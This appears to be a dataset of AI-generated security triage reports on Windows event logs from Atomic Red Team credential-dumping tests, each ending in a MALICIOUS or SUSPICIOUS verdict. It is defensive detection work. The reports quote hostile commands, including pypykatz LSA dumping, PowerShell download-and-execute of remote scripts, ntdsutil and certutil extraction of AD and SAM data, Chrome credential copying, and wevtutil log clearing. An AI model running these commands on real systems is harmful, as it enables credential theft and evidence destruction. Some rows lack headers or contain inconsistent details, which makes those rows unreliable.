   - The logs indicate multiple instances where the Event Log service and different channels (System, Security, and Windows PowerShell) have been cleared. This activity is seen in the following event entries:
     - System Log (Event ID 104): LogFileCleared for System and Windows PowerShell channels.
     - Security Log (Event ID 1102): LogFileCleared event.
   - These actions were carried out by the user ""SERVER002\admin_test"".

2. **Process Execution:**
   - There are several events showing the execution of `wevtutil.exe` with the command line argument `cl` (clear log) followed by different log channels, notably `System`, `Windows PowerShell`, and `Security`. This utility is used to manage Windows Event Logs, and its usage to clear logs suggests an attempt to cover tracks.
   - Each `wevtutil.exe` event is paired with the creation of a `conhost.exe` process, which is expected when dealing with command-line interface processes.

3. **Suspicious Process Execution:**
   - An attempt to execute `cmd.exe` with a suspicious command line:
     - Command: `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\venv_t1003_001\Scripts\pypykatz"" live lsa`
   - This indicates the execution of a tool (`pypykatz`) associated with mimikatz, a well-known tool used for credential dumping from memory (indicative of malicious intent).

4. **Use of High Integrity Level:**
   - All suspicious activities are executed under a high integrity level, indicating administrative privileges were used, which is consistent with potential privilege escalation or misuse.

5. **Process Ancestry and Correlation:**
   - Several processes seem to originate from a parent process `wsmprovhost.exe` with the command-line parameter `-Embedding`. This context is often associated with Windows Remote Management (WinRM) services or scripting activities, possibly reflecting remote command execution.

**Assessment of the Situation:**

- The sequence of events demonstrates strongly coordinated activity involving the clearing of event logs and execution of credential dumping tools.
- The use of `wevtutil.exe` to clear event logs under the guise of an administrator (`admin_test`) and hiding the track of executed commands highlights a potential attempt to maintain persistence and remain undetected.
- The execution of `pypykatz` indicates direct malicious intent to extract credentials.

**Threats or Risks Identified:**

- The ability to clear event logs and run credential dumping tools signifies a significant threat, implying attacker presence aiming for privileged access and data extraction.

Cached Credential Dump via Cmdkey,"Upon reviewing the provided Windows event logs, I've identified several relevant events that together may indicate suspicious activity:

### Suspicious Activities:

1. **Log Clearing Events:**
   - **System Log: Event ID 104** - Logs indicate that the ""admin_test"" user has cleared the System and Windows PowerShell logs. This is performed by `wevtutil.exe` with image path `C:\Windows\System32\wevtutil.exe`, which is a legitimate utility used to clear event logs. Clearing logs can be used to hide malicious activities.

2. **Security Log Clearance:**
   - **Security Log: Event ID 1102** - The ""admin_test"" user has cleared the Security event logs. Such activity is highly suspect as it could be an attempt to cover tracks related to unauthorized activities.

3. **High Privilege Use:**
   - **Security Log: Event ID 4672** - Privileges such as `SeSecurityPrivilege, SeBackupPrivilege, SeDebugPrivilege` were obtained by the ""admin_test"" user. These privileges enable the user to access sensitive security operations and system components, often used maliciously.

4. **Suspicious Use of Utilities:**
   - **Sysmon Log: Event ID 1** - Multiple processes like `cmd.exe` executing `cmdkey /list` and `wevtutil.exe` clearing logs were seen. The use of `cmdkey` to list credential cache entries could indicate credential access attempts for further attacks or persistence.

5. **Network-Related Anomalies:**
   - **Security Log: Event IDs 4624, 4634** - Logons using NTLM from a workstation DESKTOP-3HL5B2P could indicate lateral movement. The presence of elevated tokens and impersonation level in these events further draws suspicion.

6. **Execution of Low-Level Utilities:**
   - **Sysmon Log: Event ID 1** - Commands such as `whoami.exe`, `hostname.exe` are executed, typically used to gather information about the system and logged-in users, often seen in post-exploitation phases.

### Assessment:

The combination of log clearing activities, use of high privilege features, inappropriate use of credential and event log utilities, and possible lateral movement indicatives strongly suggest that the activities captured in these logs are suspicious. While no outright malicious behavior like known malware execution or exploitation is detected directly in these logs, the actions strongly deviate from normal administrative activities and indicate potential compromise or unauthorized attempts to gain persistence, escalate privileges, or conduct reconnaissance.

### Recommended Actions:

1. **Resolution: SUSPICIOUS**
   - Investigate the intent and origin of ""admin_test"" user activities. Check whether these activities align with any ongoing security operations or legitimate administrative tasks.
   - Isolate the impacted systems for further analysis to ensure no ongoing active compromise exists.
   - Conduct a broader investigation into network traffic and manual inspection of the involved systems for potential indicators of compromise not logged (like file or registry changes).
   - Audit privileged accounts and apply stricter monitoring and control measures to prevent unauthorized access.

Given the suspicious nature of these activities, further analysis and monitoring are necessary to validate the extent of any compromise and ensure system integrity."
WinPwn - SessionGopher,"### Detailed Analysis of Logs

#### Suspicious and Anomalous Behavior:

1. **Log File Clearing and PowerShell Activity**:
   - **Event Record IDs: 3566, 3567, 30350**: Logging events in the System and Security logs indicate that the logs were cleared by the user `admin_test`. Clearing event logs is a common way to cover tracks after malicious activity.
   - **PowerShell Activity**: The security logs show a PowerShell command execution that downloads and executes a script from ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1"". This script, `WinPwn.ps1`, is associated with a well-known post-exploitation toolset designed to penetrate and exploit Windows hosts and thus, indicates compromise.

2. **Process Execution**:
   - **Sysmon Logs**: Multiple instances of `wevtutil.exe` are seen clearing different event logs (e.g., Sysmon/Operational, Application, Security, System). This utility is used to manage event logs and its use here aligns with the malicious behavior of log tampering and cover-up.
   
3. **Integrity Level and Execution Context**:
   - All processes are executed with a high integrity level by the user `admin_test`, indicating that there might have been a privilege escalation attack previously to leverage higher access to the system.

4. **Repeated Process Execution**:
   - The repeat execution of network services and utility processes, such as `whoami.exe`, `conhost.exe`, and `PowerShell.exe`, in close succession is indicative of a script or automated task running, consistent with scripted attacks like those defined in malicious PowerShell tooling.

#### Malicious Indicators:
- Use of PowerShell to download and execute external scripts without verification.
- Systematic clearing of logs across various channels flagging an attempt to erase forensic evidence.
- Suspect utility usage (`wevtutil`) to clear logs, typically not required for normal operations by domain users but rather typical of intrusion or post-exploit activities.

### Assessment and Identified Threats:

Upon reviewing the logs, malicious activity is evident. The activity around PowerShell execution just before the clearing of logs directly points towards a deliberate malicious action, potentially by an unauthorized internal actor or an external attacker with high-level access. This compromise appears to aim at escalating and maintaining access while erasing footprints.

### Resolution

**MALICIOUS**

### Guidance and Recommendations:

1. **Immediate Incident Response Activation**:
   - Contain the affected systems, isolate the suspected machine (SERVER002) from the network to avoid propagation.
   - Perform an in-depth forensic investigation to determine the full scale and scope of the compromise.

2. **Credential and Access Review**:
   - Immediately review and reset credentials associated with `admin_test` and any other potentially compromised accounts.
   - Implement stronger authentication policies and consider multi-factor authentication (MFA).

3. **Audit and Monitoring**:
   - Begin extensive logging and monitoring to detect any spread to other systems.
   - Deploy endpoint detection and response tools to identify and contain further threats.

4. **Patch and Update**:
   - Ensure all systems are updated with the latest security patches.
   - Specifically, PowerShell and other administrative tools need to be restricted and monitored for unauthorized script execution.

Create Volume Shadow Copy with Powershell,"After carefully analyzing the provided Windows event logs, several suspicious behaviors stand out, indicating potential malicious activity:

1. **PowerShell Execution with Suspicious Commands**:  
   The PowerShell log contains an entry where PowerShell is used to create a shadow copy of the C: drive using the `gwmi -list win32_shadowcopy` command followed by `.Create('C:\\','ClientAccessible')`. The use of shadow copies is a known technique used by attackers to access or exfiltrate data, as well as a common method in ransomware attacks to bypass file locks.

2. **Event Log Clearing**:  
   The Sysmon log records multiple instances of `wevtutil.exe` being used to clear event logs (e.g., `wevtutil.exe cl Application`, `cl Microsoft-Windows-Sysmon/Operational`, etc.). Log clearing, especially within a short time span and without an administrative maintenance reason, can indicate an attempt to cover tracks after unauthorized activity.

3. **System Time Manipulation**:  
   The Security and System logs indicate that the system time was altered. This is often done to manipulate time-related security measures or to mislead forensic investigation.

4. **Credential Access Activity**:  
   Multiple Security events indicate attempts to access credential-related operations with zeros for ""CountOfCredentialsReturned,"" which might show failed attempts to obtain credentials. This, combined with suspicious PowerShell activity, raises red flags about potential credential theft attempts.

5. **Process Execution under Admin Account**:  
   Various processes are initiated by the `admin_test` account, with high integrity levels (indicative of administrative privileges), executing potentially suspicious tasks. The usage of high privileges further amplifies the risk.

**Assessment**: Based on the analysis, the behavior observed in the logs is consistent with tactics commonly used by attackers during the execution phase of an attack lifecycle. The use of PowerShell to create shadow copies, event log clearing activity, and attempts to manipulate system logs and access credentials strongly suggest malicious intent.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the affected machine (Server002) from the network to prevent further lateral movement or data exfiltration.
- Conduct a thorough investigation to understand the full impact scope, including what data might have been accessed or manipulated.
- Seek to identify any unauthorized changes or installations made on the system.
- Review and enhance security monitoring to detect similar activities elsewhere in the environment.
- Consider leveraging threat intelligence feeds to correlate detected activities with known indicators of compromise (IOCs).
- Educate the user account responsible for recent activity (`admin_test`) on security best practices and potential account compromise, advising a password change and review of security controls."
Steal Chrome Cookies (Windows),"**Detailed Analysis of the Logs:**

Upon examining the provided Windows event logs, there are several indicators of potentially malicious activities:

1. **Event Log Clearing:**
   - The System, Windows PowerShell, and Security logs show events where the logs have been cleared by the user `admin_test` using the command-line utility `wevtutil.exe`. Log clearing is a significant indicator of malicious activity as attackers often clear logs to cover their tracks.
   
2. **Command-Line Execution:**
   - The execution of `wevtutil.exe` to clear logs on the `System`, `Application`, and `Windows PowerShell` channels is recorded. This utility is being executed with high integrity level permissions.
   - The use of PowerShell with a command that includes stopping the `chrome` process and accessing Chrome cookies indicates suspicious intent. The command involves manipulating files potentially containing sensitive information (`Cookies` database) and writing them to a file, which is commonly associated with credential theft or data exfiltration.
   
3. **Parent-Child Process Relationships:**
   - The Parent Image for `wevtutil.exe` is consistently `wsmprovhost.exe`, a Windows process that is not commonly associated with the clearing of event logs, pointing further to potentially malicious misuse of system processes.
   
4. **Unusual System Utilities Usage:**
   - The consistent use of command-line tools and utilities (e.g., `wevtutil.exe`, `powershell.exe`, `cmd.exe`) across different channels and executed by `admin_test` is another red flag.

5. **Execution Context & Integrity Levels:**
   - The operations are taking place under the user context `SERVER002\admin_test` with high integrity levels. This indicates that the actions are performed with elevated privileges, which can be a hallmark of privilege abuse in a compromised environment.

Based on the facts that:
- Event logs have been systematically cleared.
- There are unusual command sequences accessing browser cookies.
- There is an execution of high integrity level processes performing sensitive operations without apparent legitimate reason.

**Assessment of the Situation:**
These logs collectively suggest a strong indication of malicious activity. The actions observed are commonly associated with covert data theft and cover-up operations post-compromise. 

**Resolution:**
MALICIOUS - The activities logged are consistent with malicious behavior, specifically indicative of post-compromise actions to steal data and hide tracks.

Dump Chrome Login Data with esentutl,"**Analysis of Windows Event Logs:**

Upon reviewing the Sysmon, Security, System, and Application logs, several indicators point towards suspicious activity on the system named ""Server002,"" particularly involving the user ""SERVER002\\admin_test.""

**Key Observations:**

1. **Execution of Windows Event Command-Line Utility (wevtutil.exe):**
   - The execution of `wevtutil.exe` to clear logs is observable multiple times in the Sysmon log:
     - Clearing of `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell` logs.
     - Such activity, especially `wevtutil.exe cl`, is typically associated with attempts to cover tracks by clearing evidences from the event logs.

2. **Use of Esentutl.exe to Access and Copy Chrome Login Data:**
   - A command was executed using `cmd.exe` to copy Login Data from Google Chrome using `esentutl.exe`. The command `esentutl.exe /y` suggests that there was an attempt to move or handle Chrome login data, which is a known vector for stealing credentials cached by the browser.

3. **Clearing of Logs:**
   - The Security log shows EventID 1102, which indicates that the security event log was cleared.
   - The System log shows EventID 104, indicating system log files being cleared. This is a critical sign of malicious activity as attackers frequently clear event logs to hide their actions.

4. **User Activity:**
   - All activities are executed under the user ""SERVER002\\admin_test"" with high integrity levels, suggesting a privileged user performing operations that are suspicious and potentially malicious in nature.

**Assessment:**

The combination of activities such as:
- Usage of `wevtutil.exe` to clear event logs.
- Execution of commands via `cmd.exe` to access browser stored credentials.
- Repeated clearing of various critical system logs (Security, System, PowerShell).

These are strong indicators of a breach with intent to hide the footprints, characterized by credential theft activities and log tampering.

**Resolution:**

**MALICIOUS** - The logs show definitive signs of compromised activity, including credential theft and evasion techniques (log clearing).

**Guidance on How to Proceed:**
- Immediately isolate the affected system (Server002) from the network to prevent further spread or exfiltration of data.
- Conduct a forensic analysis to ascertain the extent of the compromise. Preserve all existing logs and data on the system for detailed examination.
- Change all credentials that may have been accessed or compromised, focusing on administrative accounts and potential lateral movement opportunities.

Create Symlink to Volume Shadow Copy,"Upon analyzing the provided event logs, certain activities stand out that appear suspicious and could indicate potential security incidents. Here's a detailed analysis:

1. **Event Logs Clearing:**
   - In the System log and Security log, we notice entries indicating that log files for System, Windows PowerShell, and Security were cleared by the user `admin_test`.
   - Events with ID 104 and 1102 are typically logged when event logs are cleared. This action can be a red flag, often associated with anti-forensic techniques where an attacker tries to cover their tracks.

2. **PowerShell and System Log Clear Event:**
   - The use of `wevtutil.exe` to clear various logs is recorded in the Sysmon logs. These logs confirm that `admin_test` executed these commands.
   - Clearing logs using `wevtutil` is suspicious behavior as it's generally not a common operation for legitimate users or administrators without a clear operational need.

3. **Suspicious Command Execution:**
   - A `cmd.exe` process spawn with a command line involving `vssadmin.exe` to create a shadow copy and use `mklink` to create a directory junction. 
   - This activity could be linked to tactics used in ransomware attacks where shadow copies might be manipulated.

4. **Elevated Privileges and High Integrity Processes:**
   - The user `admin_test` has a set of high privileges (e.g., SeDebugPrivilege) which are noticed in multiple events (4672). These privileges can allow potentially harmful actions.
   - Processes like `cmd.exe` and instances of `wevtutil.exe` are running with high integrity, which again points to possible privilege abuse.

5. **Use of Common System Tools:**
   - The use of native Windows utilities (`wevtutil`, `vssadmin`, `cmd`) along with elevated tokens could indicate a method to evade detection while performing actions on the system.

Overall, the combination of log clearing, the execution of suspicious commands, elevated privileges, and the tools used are consistent with activities often seen in malicious scenarios. We do not find any explicit benign explanations for these sequences of events, especially focusing on the timing, which shows a rapid series of critical operations.

**Assessment:**
- **Resolution: MALICIOUS**
- The activities logged suggest a compromise with potential data manipulation or exfiltration intent. The systematic clearing of event logs is especially indicative of malicious intent to cover tracks.

**Recommendations:**
1. Immediately investigate the actions taken by `admin_test` to determine if this is indeed authorized activity.
2. Isolate the affected host (`Server002`) to prevent further potential damage or lateral movement.
3. Conduct a detailed forensic analysis on the system to uncover any payloads or other traces of compromise.
4. Review the network logs for any unauthorized data transmission from the host.
5. Reset access credentials for `admin_test` and audit all privileged accounts.
6. Implement alerting for similar activities across other systems in the network."

dump volume shadow copy hives with certutil,"Upon analyzing the provided Windows event logs, we can identify several points of interest that may indicate suspicious or malicious activity on Server002. Let’s break down the findings:

### Suspicious Activity

1. **Event Log Clearing**
   - **System Log**: There are multiple events indicating that somebody cleared logs using wevtutil.exe. The execution of `wevtutil.exe cl` across various logs (System, Security, and Windows PowerShell) by the user `admin_test` raises red flags. This action suggests a potential attempt to cover tracks by clearing logs:
     - Security Log (EventID 1102): Indicates the security log was cleared.
     - System Log Entries: Indicate clearing of System and Windows PowerShell event logs.
   - Clearing event logs, especially without a clear, legitimate reason is a common tactic used by attackers to erase evidence of their activities.

2. **Use of CertUtil with Shadow Copies**
   - **Sysmon Log**: There is evidence of `certutil.exe` being used with shadow copies, specified in the command line as `certutil -f -v -encodehex` targeting the SAM database over various Volume Shadow Copies. This behavior is highly indicative of an attempt to exfiltrate the SAM database to obtain password hashes, a technique consistent with privilege escalation or lateral movement tactics.
   - The extensive use of `certutil.exe` for encoding files from Shadow Copies is not typical in standard operations and suggests malicious intent.

3. **Unusual Use of cmd.exe and Remote Utilities**
   - **Sysmon Log**: The logs show command execution with `cmd.exe` aimed at performing operations on Volume Shadow Copies and encoding of files, which aligns with methodologies seen in post-exploitation phases of an attack.

4. **Execution of System Utilities**
   - **Sysmon Log**: Usage of utilities like `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and `cmd.exe` by the `admin_test` user does not usually indicate malicious activity on its own, but within the context of the clearing of logs and other events, it raises suspicions.

### Assessment

The series of actions observed in the logs, such as the clearing of event logs, usage of `certutil.exe` for encoding files from Volume Shadow Copies, and command-line operations that appear abnormal, highly suggest malicious activity. These activities exhibit strong indicators of compromise and align with tactics seen in advanced persistent threat scenarios aimed at executing covert operations and data exfiltration.

### Resolution: MALICIOUS

**Threats or Risks Identified**: The observed behavior points to potential compromise involving unauthorized actions, likely in an attempt to discover, escalate, or maintain persistent unauthorized access to the system.

### Guidance on How to Proceed

1. **Immediate Containment and Investigation**:
   - Disconnect the affected system from the network to prevent further exfiltration or lateral movement.
   - Conduct a full forensic analysis on the system to identify any other possible breaches and gather evidence.
   - Review recent access logs and correlate with other network or endpoint activity to identify the origin of compromise and its scope.

2. **Credential Management**:
   - Reset credentials for all accounts, especially administrative and privileged accounts that may have been accessed.
   - Analyze for any signs of lateral movement to other systems in the network and take appropriate actions.

3. **Security Enhancements**:
   - Implement tighter controls on the use of command-line utilities like `wevtutil.exe`, `certutil.exe`, etc.
   - Utilize security information and event management (SIEM) solutions to detect similar activities in real-time and enhance logging to include more context around executed commands.

4. **Employee Awareness**:
   - Consider briefing the user community, especially privileged users, on safe practices and internal threats profiling.

This situation requires urgent attention to both remediate the current threat and bolster defenses against potential future threats."
Dump Credential Manager using keymgr.dll and rundll32.exe,"**Assessment of Windows Event Logs for Suspicious Activity**

Based on the provided Windows event logs, several indicators may suggest potentially suspicious or malicious activity. I have outlined key observations from the logs along with an assessment of their implications:

1. **Clearing of Event Logs:**
   - Multiple `LogFileCleared` events were observed in the System and Security logs, with Event ID 104 in the System log and Event ID 1102 in the Security log. These entries indicate that logs for the System, Security, and PowerShell channels have been cleared by the `admin_test` user.
   - Log clearing is a common tactic used by attackers to hide their tracks and can indicate malicious activity if not part of routine administrative actions.

2. **Privileged Actions:**
   - Multiple 4672 events indicate that the `admin_test` user logged in with special privileges, including `SeDebugPrivilege`, `SeSecurityPrivilege`, and others that are commonly associated with activities that require elevated access.
   - The presence of these privileges suggests potentially risky actions, especially combined with the clearing of logs.

3. **Use of `wevtutil.exe`:**
   - The logs explicitly show the execution of `wevtutil.exe` clearing various logs (System, Application, Security, PowerShell). `wevtutil.exe` is a legitimate Windows utility used to manage event logs but can be co-opted for malicious purposes, such as log tampering.
   - The frequency and nature of its use here are unusual and suspicious, given its correlation with the log clearing entries.

4. **Execution of PowerShell with Suspicious Commands:**
   - The logs show `powershell.exe` executed with the command `rundll32.exe keymgr, KRShowKeyMgr`, which typically opens the credentials manager. Although not inherently malicious, this command is unusual if not expected in normal operations.
   - The association of this command with the PowerShell execution occurring around the same time as the log-clearing activity raises a red flag.

5. **Usage of `whoami` and `hostname` Commands:**
   - The logs also reveal execution of `whoami` and `hostname` commands, which can be normal for system diagnostics but may indicate enumeration attempt in a security context, especially examined in light of the other events.

6. **Remote Authentication:**
   - Observations of `4624` successful logon events indicate network logons (Logon Type 3) using NTLM. The `NtLmSsp` process connects with IP addresses in a private address space, which could imply connections from authorized remote users or lateral movement within the internal network.

**Resolution: SUSPICIOUS**

Given these observations, the activities recorded are SUSPICIOUS and warrant further investigation to confirm whether they were authorized maintenance operations or if they indicate a security breach. The combination of log clearing, high privilege operations, and usage of PowerShell and other diagnostic tools point to potentially harmful activities that must be examined in detail.

**Recommendations for Further Investigation:**
- Verify the actions of the `admin_test` user to determine if they align with expected administrative activities.
- Check for any anomaly or correlation with any other unusual access, especially against high-value systems.
- Conduct a forensic review of the endpoint to check for persistence mechanisms or further evidence of unauthorized access.
- Reinforce monitoring on similar actions across other critical systems to preempt potential threats.
- Discuss with the involved parties to gather context about performed actions and intentions."

1. **Log Clearing Events:**
   - The logs show multiple instances of the ""wevtutil.exe"" command, used to clear various event logs such as Sysmon, Application, and Security logs. The clearing of event logs is suspicious, as it can indicate an attempt to cover tracks after malicious activities (Sysmon Event IDs 1, 5, Security Event ID 1102).

2. **Suspicious PowerShell Activity:**
   - There are PowerShell events (PowerShell log) indicating the execution of a script downloaded from ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn"", which is a known script repository for conducting penetration tests or potential malicious activities. The command involves downloading and executing a script with PowerShell, which is a common method used in attacks to execute scripts directly in memory without writing to disk.

3. **Changing Time Settings:**
   - The Kernel-General events show changes to the system time. While not inherently malicious, this behavior, combined with log clearing, might be indicative of an attempt to obfuscate timestamps to confuse defenders (Security Event ID 4616).

4. **Process Execution Observation:**
   - The logs indicate the use of system utilities such as ""HOSTNAME.EXE"" and ""whoami.exe"" without apparent need in the context of server operation, suggesting possible reconnaissance activities.

5. **Integrity Level and High Privilege Usage:**
   - Events show execution under high integrity levels, which suggest that the processes are executed with elevated privileges, typically seen during privilege escalation or use of compromised administrative credentials.

Based on these observations, the activities logged raise significant concerns about potential malicious behavior. The indirect evidence—clearing of logs, suspicious PowerShell execution, and potential time manipulation—collectively point towards a possible compromise and obfuscation techniques.

### Resolution:
- **MALICIOUS:** The evidence from the logs strongly indicates malicious activity. The execution of potentially harmful PowerShell scripts and actions to clear event logs suggest an intentional effort to perform and hide malicious operations on the CEO's machine.

### Recommended Actions:

PowerDump Hashes and Usernames from Registry,"### Analysis of Logs

After reviewing the provided logs, several findings suggest potential indicators of malicious activity on the system named ""Server002.""

#### Suspicious and Anomalous Behavior

1. **Event Log Clearing:**
   - There are multiple events showing that the event logs were cleared (`EventID: 104` in System log, `EventID: 1102` in Security log). The user associated with these actions is `admin_test`, and the process involved is `wevtutil.exe`. Clearing event logs can be employed by an attacker to cover their tracks, making it difficult to trace their activities.

2. **Unusual PowerShell Activity:**
   - PowerShell was executed with specific command-line arguments aimed at disabling Windows Defender and potentially executing a malicious script: `Invoke-PowerDump`. This script was loaded from a path resembling the temporary execution directory for red team testing tools (e.g., Atomic Red Team), which is known for simulating attacker techniques.

3. **Command-line Details:**
   - The PowerShell command used attempts to bypass defenses and import a script (`PowerDump.ps1`) from an unexpected temporary location associated with red team testing. The command `Invoke-PowerDump` is typically used to execute credential dumping, which is a sensitive operation that could be an indicator of compromise.

4. **Process Execution Context:**
   - The integrity level of the processes executing these potentially malicious commands is ""High,"" indicating they are running with elevated privileges, further increasing the risk level of these activities.

5. **Other Executables and Indicators:**
   - While other processes such as `wuauclt.exe` (Windows Update) and legitimate software updates (e.g., Microsoft Edge) are running, these are typical system activities and do not directly contribute to the suspicion raised by the previously mentioned events.

6. **Windows Defender Status:**
   - Despite the attempted PowerShell activity, an application log entry indicates that Windows Defender security product state is `ON`. This could mean that the PowerShell attempt to disable Defender was either unsuccessful or temporary.

#### Assessment

Based on the analysis above, clearing event logs and executing PowerShell commands to disable Windows Defender and execute a known credential dumping script (`Invoke-PowerDump`) are strong indicators of malicious activity. These actions are typical techniques used by attackers to gain access to sensitive credentials and hide their tracks by erasing activities from event logs.

#### Guidance and Resolution

- **Containment and Eradication:**
  - Immediately isolate the affected machine to prevent any lateral movement within the network and contain the potential threat.
  - Conduct a full memory and disk analysis on the affected machine to identify any further malicious scripts or tools that may have been deployed.

- **Recovery and Monitoring:**
  - Restore the machine to a known good state from backups, if available.
  - Implement increased monitoring and alerting on PowerShell usage and event log clearing activities across all critical systems.

- **Further Investigation:**
  - Investigate the access path of `admin_test` and confirm whether it was a legitimate account action or if the account may have been compromised.

Given the presence of these activities, the resolution for the logs is marked as ***MALICIOUS***. These logs indicate a probable compromise, requiring immediate attention and a thorough investigation to further assess the extent of the incident."
Dump Active Directory Database with NTDSUtil,"Upon analysis of the logs provided, several events raise concerns of potential malicious activity:

1. **Registry Enumeration**: 
   - The command-line entry for `reg.exe` with the command `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions /v ProductType` suggests enumeration of registry keys. This could be benign if part of a legitimate operation but could also be indicative of attempts to enumerate system information by unauthorized users or processes.

2. **Event Log Clearing**:
   - Logs indicate a sequence of `wevtutil.exe cl` commands:
     - This command is used to clear event logs (`wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, `wevtutil.exe cl Security`, `wevtutil.exe cl ""Windows PowerShell""`).
   - These actions are highly suspicious, particularly as they are used to delete traces of unauthorized activities that may have occurred on the system.

3. **NTDSUtil Command**:
   - The command `cmd.exe /c mkdir C:\Windows\Temp\ntds_T1003 & ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\ntds_T1003"" q q` is observed.
   - This seems to be an attempt to create a System State backup using `ntdsutil`, which could be used to dump sensitive information such as Active Directory data, particularly concerning as the `T1003` string indicates an attempt related to a known MITRE ATT&CK technique for credential dumping.

4. **Event ID 1102 in the Security Log**:
   - This event indicates that the security log was cleared. It was performed by the same user `admin_test` that appeared in the suspicious event logs. This is a common tactic used by attackers to hide their tracks.

5. **High Integrity Level Processes**:
   - A significant number of processes in the logs are running with a high integrity level, suggesting potential privilege escalation.

Considering the above findings, there are clear indicators of potentially malicious behavior:
- The use of `reg.exe` and `wevtutil.exe` in the context described is generally associated with recon and cleanup activities of an attacker.
- The NTDSUtil usage is a strong sign of an attempt to extract sensitive credential data.
- The consistent clearing of event logs demonstrates an attempt to obfuscate tracks.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- Immediate isolation of the system `Server002` to prevent further compromise and lateral movement.
- A full forensic investigation should be conducted to understand the scope of the breach.

Dump credentials from Windows Credential Manager With PowerShell [web Credentials],"**Detailed Analysis of Logs:**

1. **Log File Clearing:**
   - Multiple instances of event ID 104 (Log cleared) across different channels (System and Windows PowerShell) suggest that someone has deliberately cleared logs. This action is typically associated with an attempt to hide malicious behavior, especially when carried out by user ""admin_test"" with high privileges.

2. **Command Line Activity:**
   - The Sysmon logs show the execution of PowerShell (EventID 1) with a command to download and execute a potentially malicious script from an external URL (https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1). The usage of `IEX (IWR...)` is highly suspicious as it executes commands directly from an Internet location, a typical behavior used by attackers to fetch and run code without being detected.

3. **Wevtutil Execution:**
   - The execution of `wevtutil.exe` with the ""cl"" argument (which clears logs) under the `SERVER002\admin_test` account, further supports the attempt to cover tracks.

4. **Execution Context:**
   - The processes were executed under the ""NT AUTHORITY\SYSTEM"" account, indicating high privileges which can be exploited for malicious intents.

5. **Use of PowerShell:**
   - Continuous state changes and the use of external PowerShell scripts are red flags, indicating an attempt to abuse PowerShell for potentially unauthorized actions.

6. **Anomalous Use of System Utilities:**
   - The execution of system utilities like `whoami.exe`, `hostname.exe`, and the repeated clearing of event logs via `wevtutil.exe` all point towards actions commonly associated with reconnaissance and cleaning tracks post-compromise.

**Assessment of the Situation:**
The log entries, particularly clearing event logs, external script execution using PowerShell with elevated privileges, and interaction with the system utilities in a manner consistent with hiding tracks, are indicative of a compromised system. This kind of activity is characteristic of an advanced threat actor attempting to infiltrate, gather credentials, and maintain persistence.

**Identified Threats or Risks:**
- Potential unauthorized access and execution of arbitrary scripts can lead to data theft, credential compromise, and further spread of malicious activity within the organization’s network.
- Clearing of logs potentially means that the attacker managed to cover some of their tracks, making it difficult to determine the full extent of the impact.

**Guidance on How to Proceed:**
- Immediately isolate the affected system from the network to prevent further unauthorized access.
- Conduct a comprehensive forensic investigation to determine the full scope and scale of the compromise.
- Remove any potential malware/scripts downloaded or running as per the logs.
- Reset credentials used on the compromised system and other systems with shared credentials.
- Review and enhance security monitoring and logging measures, ensuring sufficient log retention to prevent tampering.
- Educate users on recognizing phishing and social engineering tactics.

   - **Powershell Execution:** Sysmon Event ID 5 highlights the execution of `powershell.exe` by the user `admin_test`, which can be legitimate but is often used by attackers for malicious activities due to its powerful capabilities.
   - **`wevtutil.exe` Command Usage:** Several `wevtutil.exe` commands are executed by `admin_test` to clear event logs such as Sysmon, Application, System, and Security. This is highly suspicious because attackers often clear logs to cover their tracks (Process IDs: 4336, 3252, 2816, 4604, and 4936).

2. **Log Clearing:**
   - **Security Log Cleared (Event ID 1102):** Indicates the security log was explicitly cleared, a tactic often employed post-compromise to hide evidence of malicious activity.

3. **Execution of Potentially Malicious Binaries:**
   - **Cmd.exe Command Involving PsExec:** The command has unusual command-line arguments involving `PsExec.exe`, another powerful tool often used for lateral movements or privilege escalation (`cmd.exe` ProcessId: 5180).

4. **Parent Processes and High Integrity Level:**
   - Multiple instances of high privilege executions with conhost.exe and other system utilities indicate scripts or automated tools are executing potentially malicious tasks.
   - Parent processes often trace back to system processes like `wsmprovhost.exe` with high integrity, suggesting misuse of Windows Management Instrumentation (WMI).

5. **Network Anomalies:**
   - User `NT AUTHORITY\NETWORK SERVICE` executed `sppsvc.exe`, which is somewhat common but needs to be checked if it aligns with service configurations due to its potential misuse in prior attacks.

### Conclusion:

The behavioral pattern of log clearing, the specific use of `wevtutil`, combined with unusual Powershell and PsExec executions, strongly indicate possible malicious activity. The chain of these activities suggests attempts to bypass detection and hide tracks, especially concerning log clearance.

### Recommended Actions:

1. **Immediate Investigation:**
   - Quarantine the affected host (Server002) from the network for deeper forensic analysis.
   - Review user access logs and correlate with times of suspicious activities to understand the user `admin_test` activities.

2. **Log and System Review:**
   - Retrieve backups of cleared logs if available and analyze them for entry points or other suspicious activities.
   - Check for unauthorized binary implementations in temporary directories, especially scripts or executables.

3. **Network and Host Monitoring:**
   - Increase logging and monitoring on all critical systems and ensure all endpoints have updated security configurations.
   - Deploy honeypots to see if malicious actors attempt further penetration.

4. **User Awareness and Privilege Management:**
   - Revise privilege levels of users, especially service accounts like `admin_test`, to follow least-privilege principles.
   - Conduct awareness training focused on identifying and responding to suspicious activities.

### Resolution:

**MALICIOUS** - The logs undoubtedly contain indications of malevolent actions, including but not limited to event log clearing, potential misuse of legitimate Windows utilities and system tools, and signs of executed commands indicative of post-exploitation activities. Further investigation is critical to assess and mitigate the impact of the compromise."
Send NTLM Hash with RPC Test Connection,"After reviewing the provided logs, here is a detailed analysis of the events:

### Suspicious and Anomalous Behavior:
